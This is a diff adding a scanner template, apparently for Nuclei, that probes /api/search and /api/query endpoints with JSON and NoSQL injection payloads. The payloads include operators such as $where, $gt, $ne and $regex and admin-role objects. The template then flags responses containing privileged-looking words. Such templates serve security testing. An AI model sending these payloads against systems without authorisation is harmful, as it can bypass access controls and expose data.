@@ -1,0 +1,55 @@
+id: json-injection-extended
+name: "JSON Injection Extended Detection"
+severity: "critical"
+tags: [json, injection, deserialization]
+description: |
+  扩展的 JSON 注入检测。
+  使用 range 循环测试多个 JSON 注入载荷，变量延迟解析。
+
+variables:
+  # 变量延迟解析：定义 JSON 注入载荷
+  json_injection: '{"user":"admin","role":"admin"}'
+  json_traversal: '{"search":{"$regex":".*","$options":"i"}}'
+
+http:
+  - raw: |
+      POST /api/search HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/json
+
+      {"search": "{{json_injection}}"}
+    range:
+      key: "json_injection"
+      values:
+        - '{"user":"admin","role":"admin"}'
+        - '{"username":"admin"}'
+        - '{"id":1,"role":"admin"}'
+        - '{"filter":{"$where":"1==1"}}'
+        - '{"query":{"$gt":""}}'
+    matchers:
+      - type: word
+        words:
+          - "admin"
+          - "role"
+          - "privileged"
+      - type: status
+        status: [200]
+
+  - raw: |
+      POST /api/query HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/json
+
+      {"filter": "{{json_traversal}}"}
+    range:
+      key: "json_traversal"
+      values:
+        - '{"$regex":".*","$options":"i"}'
+        - '{"$gt":""}'
+        - '{"$ne":null}'
+        - '{"$where":"true"}'
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "len(body) > 0"
